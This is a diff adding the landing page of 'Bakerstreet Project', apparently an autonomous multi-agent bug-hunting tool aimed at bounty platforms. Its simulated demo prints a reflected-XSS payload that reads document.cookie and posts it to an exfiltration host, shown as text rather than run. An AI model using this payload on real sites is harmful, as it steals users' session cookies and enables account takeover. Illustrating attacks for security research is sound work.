@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bakerstreet Project | Pioneering Autonomous Cybersecurity</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #0a0a0b; color: #e4e4e7; scroll-behavior: smooth; }
+        .mono { font-family: 'Fira Code', monospace; }
+        .gradient-text {
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .prime-card {
+            background: rgba(24, 24, 27, 0.6);
+            border: 1px solid rgba(63, 63, 70, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .prime-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #3b82f6, transparent);
+            transition: 0.5s;
+        }
+        .prime-card:hover::before {
+            left: 100%;
+        }
+        .prime-card:hover {
+            border-color: #3b82f6;
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px -20px rgba(59, 130, 246, 0.3);
+        }
+        .hero-glow {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 30%, rgba(59, 130, 246, 0.15), transparent 70%);
+            z-index: -1;
+            pointer-events: none;
+        }
+        .scanline {
+            width: 100%;
+            height: 2px;
+            background: rgba(59, 130, 246, 0.1);
+            position: absolute;
+            animation: scan 8s linear infinite;
+            z-index: 10;
+            pointer-events: none;
+        }
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+    </style>
+</head>
+<body class="antialiased">
+    <div class="scanline"></div>
+    
+    <!-- Navigation -->
+    <nav class="border-b border-zinc-800 bg-black/50 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16 items-center">
+                <div class="flex items-center space-x-2">
+                    <div class="w-8 h-8 bg-blue-600 rounded flex items-center justify-center font-bold text-white">B</div>
+                    <span class="text-xl font-extrabold tracking-tight text-white uppercase">Bakerstreet <span class="text-blue-500">Project</span></span>
+                </div>
+                <div class="hidden md:flex space-x-8 text-sm font-medium text-zinc-400">
+                    <a href="#about" class="hover:text-white transition">About</a>
+                    <a href="#technology" class="hover:text-white transition">Technology</a>
+                    <a href="#demo" class="hover:text-white transition">Demo</a>
+                    <a href="#vision-robotics" class="hover:text-white transition">Vision</a>
+                    <a href="#partners" class="hover:text-white transition">Partners</a>
+                    <a href="mailto:bakerstreetbandit@zohomail.eu" class="text-blue-500 hover:text-blue-400 border border-blue-500/20 px-4 py-1.5 rounded-full hover:bg-blue-500/10 transition">Contact Us</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <header class="relative pt-32 pb-40 overflow-hidden">
+        <div class="hero-glow"></div>
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 text-center">
+            <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold mb-6 uppercase tracking-wider">
+                <span>Autonomous Security Research v2.0</span>
+            </div>
+            <h1 class="text-5xl md:text-8xl font-black tracking-tighter text-white mb-8">
+                Securing the <span class="gradient-text">Digital Frontier</span>
+            </h1>
+            <p class="text-xl text-zinc-400 max-w-3xl mx-auto mb-12 leading-relaxed font-light">
+                Bakerstreet Project is redefining cybersecurity through multi-agent autonomous intelligence. We build the systems that protect the modern software supply chain at machine speed.
+            </p>
+            <div class="flex flex-col sm:flex-row justify-center items-center space-y-4 sm:space-y-0 sm:space-x-4">
+                <a href="#technology" class="w-full sm:w-auto px-10 py-4 bg-white text-black font-bold rounded-full hover:bg-zinc-200 transition-all duration-300 transform hover:scale-105">Explore PrimeCores</a>
+                <a href="#demo" class="w-full sm:w-auto px-10 py-4 bg-zinc-900 text-white font-bold rounded-full border border-zinc-700 hover:bg-zinc-800 transition-all duration-300">View Live Demo</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- About Section -->
+    <section id="about" class="py-32 bg-zinc-950 border-y border-zinc-900">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid md:grid-cols-2 gap-20 items-center">
+                <div>
+                    <h2 class="text-4xl font-bold text-white mb-8">Intelligence Beyond Scanning</h2>
+                    <p class="text-zinc-400 text-lg mb-8 leading-relaxed">
+                        Traditional security tools are reactive and fragmented. Bakerstreet Project develops proactive, autonomous systems that don't just find vulnerabilities—they understand them through multi-agent consensus.
+                    </p>
+                    <p class="text-zinc-500 mb-10 leading-relaxed">
+                        Our flagship **Terminal 221B** ecosystem leverages the PrimeCores orchestration layer to achieve human-level accuracy in exploit generation and verification.
+                    </p>
+                    <div class="grid grid-cols-2 gap-6">
+                        <div class="border-l-2 border-blue-600 pl-4">
+                            <div class="text-2xl font-bold text-white">225+</div>
+                            <div class="text-sm text-zinc-500">Targets Analyzed / Hour</div>
+                        </div>
+                        <div class="border-l-2 border-purple-600 pl-4">
+                            <div class="text-2xl font-bold text-white">95%</div>
+                            <div class="text-sm text-zinc-500">True Positive Accuracy</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="relative">
+                    <div class="absolute -inset-4 bg-blue-600/10 blur-3xl rounded-full"></div>
+                    <div class="relative bg-zinc-900 rounded-3xl border border-zinc-800 p-8 shadow-2xl">
+                        <h3 class="text-xl font-bold text-white mb-4">Strategic Innovation</h3>
+                        <ul class="space-y-6">
+                            <li class="flex items-start space-x-4">
+                                <div class="w-6 h-6 rounded-full bg-blue-500/20 flex items-center justify-center mt-1">
+                                    <svg class="w-4 h-4 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path></svg>
+                                </div>
+                                <div>
+                                    <span class="text-white font-semibold">Autonomous Discovery</span>
+                                    <p class="text-sm text-zinc-500">Self-evolving reconnaissance across global platforms (H1, Bugcrowd, Intigriti).</p>
+                                </div>
+                            </li>
+                            <li class="flex items-start space-x-4">
+                                <div class="w-6 h-6 rounded-full bg-purple-500/20 flex items-center justify-center mt-1">
+                                    <svg class="w-4 h-4 text-purple-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path></svg>
+                                </div>
+                                <div>
+                                    <span class="text-white font-semibold">Consensus Verification</span>
+                                    <p class="text-sm text-zinc-500">13 specialized agents validating findings to eliminate false positives.</p>
+                                </div>
+                            </li>
+                            <li class="flex items-start space-x-4">
+                                <div class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center mt-1">
+                                    <svg class="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path></svg>
+                                </div>
+                                <div>
+                                    <span class="text-white font-semibold">Data Sovereignty</span>
+                                    <p class="text-sm text-zinc-500">Local LLM execution in RAM-only environments for zero-knowledge research.</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Technology Section: PrimeCores -->
+    <section id="technology" class="py-32">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-20">
+                <h2 class="text-4xl font-bold text-white mb-6">The PrimeCores Framework</h2>
+                <p class="text-zinc-400 max-w-2xl mx-auto text-lg">A council of 13 specialized AI agents, each an expert in a specific security domain, working in harmony.</p>
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- 1. Architect -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-blue-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-01 | Architect</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Infrastructure analysis and cloud security specialist, designing robust security baselines.</p>
+                </div>
+                <!-- 2. Cipher -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-purple-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-02 | Cipher</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Cryptographic weaknesses and key management auditor, identifying encryption flaws.</p>
+                </div>
+                <!-- 3. Sentinel -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-green-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-03 | Sentinel</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Global reconnaissance and OSINT enumeration, mapping the target's digital footprint.</p>
+                </div>
+                <!-- 4. Forge -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-red-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-04 | Forge</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Static code analysis and source code vulnerability detection for complex logic flaws.</p>
+                </div>
+                <!-- 5. Nexus -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-cyan-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-05 | Nexus</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Network and API security specialist, focusing on protocols and distributed systems.</p>
+                </div>
+                <!-- 6. Vault -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-yellow-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-06 | Vault</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Database security and data leak prevention, ensuring integrity and access control.</p>
+                </div>
+                <!-- 7. Phantom -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-orange-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-07 | Phantom</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Advanced PoC generation and payload orchestration, demonstrating real-world impact.</p>
+                </div>
+                <!-- 8. Echo -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-indigo-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-08 | Echo</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Communication expert, translating technical findings into professional security reports.</p>
+                </div>
+                <!-- 9. Monitor -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-emerald-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-09 | Monitor</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Finding validation and reproduction specialist, ensuring rigorous evidence for every bug.</p>
+                </div>
+                <!-- 10. Catalyst -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-pink-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-10 | Catalyst</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Severity assessment and impact analyst, prioritizing risks for maximum security gain.</p>
+                </div>
+                <!-- 11. Arbiter -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-slate-400 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-11 | Arbiter</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Consensus engine and conflict resolution, unifying the Council's final decision.</p>
+                </div>
+                <!-- 12. Automaton -->
+                <div class="prime-card p-8 rounded-2xl">
+                    <div class="text-amber-500 mb-4 font-mono font-bold tracking-widest text-xs uppercase">Core-12 | Automaton</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed">Deployment and Infrastructure-as-Code automation for rapid research scaling.</p>
+                </div>
+                <!-- 13. Oracle -->
+                <div class="prime-card p-8 rounded-2xl lg:col-span-3 border-blue-500/30">
+                    <div class="text-blue-400 mb-4 font-mono font-bold tracking-widest text-xs uppercase text-center">Core-13 | Oracle | The Synthesis Engine</div>
+                    <p class="text-zinc-400 text-sm leading-relaxed text-center max-w-2xl mx-auto">Long-term strategy and pattern recognition. The Oracle synthesizes data from all Primes to predict emerging threats and direct the Council's focus.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Live Analysis Demo -->
+    <section id="demo" class="py-32 bg-zinc-950 border-y border-zinc-900 overflow-hidden relative">
+        <div class="absolute inset-0 opacity-5 pointer-events-none">
+            <div class="h-full w-full" style="background-image: radial-gradient(#3b82f6 1px, transparent 1px); background-size: 40px 40px;"></div>
+        </div>
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="text-center mb-16">
+                <h2 class="text-4xl font-bold text-white mb-4">Council Mode in Action</h2>
+                <p class="text-zinc-400">A simulated security analysis session performed by Terminal 221B.</p>
+            </div>
+            
+            <div class="bg-black/50 rounded-3xl border border-zinc-800 p-8 md:p-12 backdrop-blur-xl shadow-2xl">
+                <div class="flex items-center space-x-2 mb-8 border-b border-zinc-800 pb-4">
+                    <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                    <span class="ml-4 text-[10px] mono text-zinc-500 uppercase tracking-tighter">SESSION_LOG_T221B_PROD_0x2026.TXT</span>
+                </div>
+                
+                <div class="space-y-12">
+                    <div class="relative pl-8 border-l border-blue-500/30">
+                        <div class="absolute -left-1.5 top-0 w-3 h-3 bg-blue-500 rounded-full shadow-[0_0_15px_rgba(59,130,246,0.6)]"></div>
+                        <h4 class="text-blue-400 mono text-xs mb-3 uppercase tracking-widest font-bold">Phase 1: Reconnaissance (Sentinel)</h4>
+                        <div class="bg-zinc-900/40 rounded-xl p-6 border border-zinc-800/50">
+                            <p class="text-zinc-300 text-sm mb-4 italic">"Mapping target surface and identifying tech stack anomalies..."</p>
+                            <ul class="text-xs mono text-zinc-500 space-y-2">
+                                <li class="flex items-center space-x-2"><span class="text-blue-500">›</span> <span>GitHub Pages infrastructure identified</span></li>
+                                <li class="flex items-center space-x-2"><span class="text-blue-500">›</span> <span>Potential DOM-based XSS vectors found in search parameters</span></li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="relative pl-8 border-l border-red-500/30">
+                        <div class="absolute -left-1.5 top-0 w-3 h-3 bg-red-500 rounded-full shadow-[0_0_15px_rgba(239,44,44,0.6)]"></div>
+                        <h4 class="text-red-400 mono text-xs mb-3 uppercase tracking-widest font-bold">Phase 2: Exploitation (Phantom)</h4>
+                        <div class="bg-zinc-900/40 rounded-xl p-6 border border-zinc-800/50">
+                            <p class="text-zinc-300 text-sm mb-4">Vector confirmed: <span class="text-red-500 font-bold">Reflected Cross-Site Scripting</span></p>
+                            <pre class="text-[10px] text-zinc-400 bg-black/60 p-4 rounded-lg overflow-x-auto mono border border-zinc-800 leading-tight">
+&lt;script&gt;
+    (async () => {
+        const c = document.cookie;
+        await fetch('https://t221b-exfil.io/log', {
+            method: 'POST',
+            body: JSON.stringify({ d: c })
+        });
+    })();
+&lt;/script&gt;</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="relative pl-8 border-l border-purple-500/30">
+                        <div class="absolute -left-1.5 top-0 w-3 h-3 bg-purple-500 rounded-full shadow-[0_0_15px_rgba(139,92,246,0.6)]"></div>
+                        <h4 class="text-purple-400 mono text-xs mb-3 uppercase tracking-widest font-bold">Phase 3: Optimization & Consensus (Arbiter)</h4>
+                        <div class="bg-zinc-900/40 rounded-xl p-6 border border-zinc-800/50">
+                            <p class="text-zinc-300 text-sm mb-4 italic">"Refining payload for stealth and establishing Council consensus..."</p>
+                            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4">
+                                <div class="text-center p-3 bg-black/40 rounded-lg border border-zinc-800">
+                                    <div class="text-[10px] text-zinc-500 uppercase mb-1">Votes</div>
+                                    <div class="text-lg font-bold text-white">11/13</div>
+                                </div>
+                                <div class="text-center p-3 bg-black/40 rounded-lg border border-zinc-800">
+                                    <div class="text-[10px] text-zinc-500 uppercase mb-1">Severity</div>
+                                    <div class="text-lg font-bold text-orange-500">8.2</div>
+                                </div>
+                                <div class="text-center p-3 bg-black/40 rounded-lg border border-zinc-800">
+                                    <div class="text-[10px] text-zinc-500 uppercase mb-1">Confidence</div>
+                                    <div class="text-lg font-bold text-green-500">94%</div>
+                                </div>
+                                <div class="text-center p-3 bg-black/40 rounded-lg border border-zinc-800">
+                                    <div class="text-[10px] text-zinc-500 uppercase mb-1">Bounty Est.</div>
+                                    <div class="text-lg font-bold text-blue-500">$3.5k</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="mt-12 pt-8 border-t border-zinc-800 text-center">
+                    <span class="text-xs text-blue-500 mono animate-pulse tracking-widest uppercase">Autonomous report submission in progress...</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Technical Foundation Section -->
+    <section id="tech-stack" class="py-32 bg-black border-t border-zinc-900">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-20">
+                <h2 class="text-3xl font-bold text-white mb-4">Technical Foundation</h2>
+                <p class="text-zinc-400">Engineered for the 2026 security landscape.</p>
+            </div>
+            <div class="grid md:grid-cols-3 gap-12">
+                <div>
+                    <div class="text-blue-500 mb-6">
+                        <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path></svg>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Edge Intelligence</h3>
+                    <p class="text-zinc-500 text-sm leading-relaxed">Native support for locally executed models (Cohete, Mistral, Dolphin) running in RAM-only environments to ensure that sensitive vulnerability data never leaves your infrastructure.</p>
+                </div>
+                <div>
+                    <div class="text-purple-500 mb-6">
+                        <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path></svg>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Multi-Platform Discovery</h3>
+                    <p class="text-zinc-500 text-sm leading-relaxed">Autonomous discovery across HackerOne, Bugcrowd, and Intigriti. Our system tracks rewards and competition factors to prioritize high-value targets automatically.</p>
+                </div>
+                <div>
+                    <div class="text-green-500 mb-6">
+                        <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3">Hardened Foundation</h3>
+                    <p class="text-zinc-500 text-sm leading-relaxed">Deep integration with Arch Linux LUKS encryption and TPM2 binding, providing an unshakeable hardware-rooted security baseline for our autonomous agents.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Future Vision: Robotics Section -->
+    <section id="vision-robotics" class="py-32 bg-zinc-950 border-t border-zinc-900">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid md:grid-cols-2 gap-16 items-center">
+                <div class="order-2 md:order-1 relative">
+                    <div class="absolute -inset-10 bg-blue-500/5 blur-[100px] rounded-full"></div>
+                    <div class="relative aspect-square bg-zinc-900/50 rounded-3xl border border-zinc-800 flex items-center justify-center overflow-hidden">
+                        <div class="absolute inset-0 opacity-20">
+                            <svg class="w-full h-full" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M10 10H90V90H10V10Z" stroke="white" stroke-width="0.1" stroke-dasharray="2 2"/>
+                                <circle cx="50" cy="50" r="30" stroke="white" stroke-width="0.1" stroke-dasharray="2 2"/>
+                            </svg>
+                        </div>
+                        <div class="text-center p-8">
+                            <div class="text-blue-500 mb-4 animate-pulse">
+                                <svg class="w-20 h-20 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
+                            </div>
+                            <h4 class="text-xl font-mono font-bold text-white uppercase tracking-tighter">Project Aurobot</h4>
+                            <p class="text-[10px] text-zinc-500 mt-2 mono uppercase tracking-widest">Physical Intelligence Blueprints : Research Phase</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="order-1 md:order-2">
+                    <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-6 uppercase tracking-wider">
+                        <span>The Next Frontier</span>
+                    </div>
+                    <h2 class="text-4xl font-bold text-white mb-8">Future Vision: Robotics</h2>
+                    <p class="text-zinc-400 text-lg mb-8 leading-relaxed">
+                        At Bakerstreet Project, our ambition extends beyond the digital realm. We believe that true autonomous intelligence must eventually bridge the gap into physical reality.
+                    </p>
+                    <p class="text-zinc-500 mb-10 leading-relaxed">
+                        Through our **Aurobot** initiative, we are researching the intersection of multi-agent LLM orchestration and physical robotics. Our goal is to create hardware-agnostic "brains" for autonomous agents capable of securing the physical world.
+                    </p>
+                    <ul class="space-y-4">
+                        <li class="flex items-center space-x-3 text-sm text-zinc-400">
+                            <span class="w-1.5 h-1.5 bg-purple-500 rounded-full"></span>
+                            <span>Hardware-Agnostic Neural Orchestration</span>
+                        </li>
+                        <li class="flex items-center space-x-3 text-sm text-zinc-400">
+                            <span class="w-1.5 h-1.5 bg-purple-500 rounded-full"></span>
+                            <span>Real-time Spatial Intelligence & Security</span>
+                        </li>
+                        <li class="flex items-center space-x-3 text-sm text-zinc-400">
+                            <span class="w-1.5 h-1.5 bg-purple-500 rounded-full"></span>
+                            <span>Edge-native Mechanical Control Layers</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Strategic Partnerships Section -->
+    <section id="partners" class="py-24 bg-black border-t border-zinc-900">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <h2 class="text-xl font-bold text-zinc-500 mb-12 uppercase tracking-[0.3em]">Accelerated By</h2>
+            <div class="flex flex-col items-center">
+                <a href="https://www.nvidia.com" target="_blank" class="group transition-all duration-500 transform hover:scale-105">
+                    <svg class="h-16 md:h-20 text-zinc-600 group-hover:text-[#76b900] transition-colors" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M23.15 15.68c-.62-.9-1.57-1.54-2.67-1.78-.34-.07-.68-.11-1.02-.11-1.03 0-2.02.32-2.84.92-.12.09-.23.19-.34.29-.02.02-.05.04-.07.06-.82.82-1.28 1.94-1.28 3.1 0 1.16.46 2.28 1.28 3.1.02.02.05.04.07.06.11.1.22.2.34.29.82.6 1.81.92 2.84.92.34 0 .68-.04 1.02-.11 1.1-.24 2.05-.88 2.67-1.78.62-.9.89-1.98.76-3.07-.13-1.09-.64-2.09-1.76-2.89zm-3.69 4.31c-.63 0-1.14-.51-1.14-1.14s.51-1.14 1.14-1.14 1.14.51 1.14 1.14-.51 1.14-1.14 1.14zm4.54-12.75l-4.22 1.37c-.32.1-.64.15-.96.15-.43 0-.85-.1-1.23-.29-.18-.09-.35-.2-.51-.33-.04-.03-.07-.07-.11-.11l-2.01-2.01c-.19-.19-.3-.45-.3-.71s.11-.52.3-.71l2.01-2.01c.04-.04.07-.08.11-.11.16-.13.33-.24.51-.33.38-.19.8-.29 1.23-.29.32 0 .64.05.96.15l4.22 1.37c1.37.44 2.29 1.71 2.29 3.15 0 1.44-.92 2.71-2.29 3.15zm-15.64 6.64c-.62-.9-1.57-1.54-2.67-1.78-.34-.07-.68-.11-1.02-.11-1.03 0-2.02.32-2.84.92-.12.09-.23.19-.34.29-.02.02-.05.04-.07.06-.82.82-1.28 1.94-1.28 3.1 0 1.16.46 2.28 1.28 3.1.02.02.05.04.07.06.11.1.22.2.34.29.82.6 1.81.92 2.84.92.34 0 .68-.04 1.02-.11 1.1-.24 2.05-.88 2.67-1.78.62-.9.89-1.98.76-3.07-.13-1.09-.64-2.09-1.76-2.89zm-3.69 4.31c-.63 0-1.14-.51-1.14-1.14s.51-1.14 1.14-1.14 1.14.51 1.14 1.14-.51 1.14-1.14 1.14z" />
+                    </svg>
+                    <span class="block text-center text-[10px] font-mono text-zinc-700 mt-2 group-hover:text-[#76b900] uppercase tracking-widest">NVIDIA</span>
+                </a>
+                <p class="max-w-2xl mx-auto mt-8 text-zinc-500 text-xs leading-relaxed">
+                    Bakerstreet Project leverages NVIDIA's AI and robotics platforms (Isaac, CUDA, Jetson) to power our PrimeCores orchestration. 
+                    Explore our research on <a href="https://github.com/NVIDIA" target="_blank" class="text-blue-500 hover:text-blue-400">NVIDIA's GitHub</a>.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Community & Open Source -->
+    <section id="community" class="py-32 bg-zinc-950 border-t border-zinc-900">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid md:grid-cols-2 gap-16 items-center">
+                <div>
+                    <h2 class="text-3xl font-bold text-white mb-6">Built for the Community</h2>
+                    <p class="text-zinc-400 mb-6 leading-relaxed">
+                        Bakerstreet Project is developed openly. Our mission is to protect privacy and freedom in an increasingly complex digital world through autonomous security research.
+                    </p>
+                    <div class="flex space-x-6">
+                        <a href="https://github.com/BoozeLee/bakerstreetproject.github.io" class="text-white font-bold hover:text-blue-500 transition border-b border-white hover:border-blue-500 pb-1">Contribute on GitHub</a>
+                        <a href="mailto:bakerstreetbandit@zohomail.eu" class="text-white font-bold hover:text-purple-500 transition border-b border-white hover:border-purple-500 pb-1">Join the Discussion</a>
+                    </div>
+                </div>
+                <div class="bg-blue-600/5 rounded-3xl border border-blue-500/10 p-10 text-center">
+                    <h3 class="text-xl font-bold text-white mb-4 italic">"Privacy is not a feature; it is a human right."</h3>
+                    <div class="flex justify-center space-x-4 mt-8">
+                        <span class="px-4 py-2 bg-black rounded-lg text-[10px] font-mono text-blue-400 border border-zinc-800">FREE & OPEN SOURCE</span>
+                        <span class="px-4 py-2 bg-black rounded-lg text-[10px] font-mono text-purple-400 border border-zinc-800">PRIVACY FIRST</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-20 border-t border-zinc-900 bg-black">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center mb-12">
+                <div class="flex items-center space-x-2 mb-6 md:mb-0">
+                    <div class="w-6 h-6 bg-blue-600 rounded flex items-center justify-center font-bold text-white text-xs">B</div>
+                    <span class="text-lg font-bold text-white uppercase tracking-tighter">Bakerstreet Project</span>
+                </div>
+                <div class="flex space-x-12 text-xs text-zinc-500 mono uppercase tracking-widest">
+                    <a href="#about" class="hover:text-white transition">About</a>
+                    <a href="#technology" class="hover:text-white transition">Technology</a>
+                    <a href="mailto:bakerstreetbandit@zohomail.eu" class="hover:text-white transition">Contact</a>
+                </div>
+            </div>
+            <div class="border-t border-zinc-900 pt-8 flex flex-col md:flex-row justify-between items-center text-[9px] mono text-zinc-600 uppercase tracking-[0.2em]">
+                <p>© 2026 BAKERSTREET PROJECT | SECURING THE DIGITAL FRONTIER</p>
+                <p class="mt-4 md:mt-0">Applying for Google for Startups Cloud Program</p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
